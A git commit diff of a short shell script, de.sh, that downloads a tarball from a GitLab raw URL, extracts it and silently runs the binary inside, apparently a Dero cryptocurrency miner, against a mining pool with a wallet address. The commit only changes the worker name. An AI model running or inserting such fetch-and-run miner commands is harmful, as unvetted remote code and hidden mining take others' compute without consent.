af511744492809b8d956d5f931818cff0c558b8e
erindiana <112599473+erindiana@users.noreply.github.com>
2022-09-04 03:55:39 +0700

    Update de.sh

--- de.sh
+++ de.sh
@@ -1,3 +1,3 @@
 #!/bin/sh
 wget https://gitlab.com/yuri.boyka.29111222/slebw/-/raw/main/dr.tar.gz && tar -xf dr.tar.gz
-./dr -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmylq8cq7asn9nqswcd3s.$(echo $(shuf -i 1000-999999 -n 1)-Budug) >/dev/null >/dev/null 2>&1
+./dr -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmylq8cq7asn9nqswcd3s.DER >/dev/null >/dev/null 2>&1
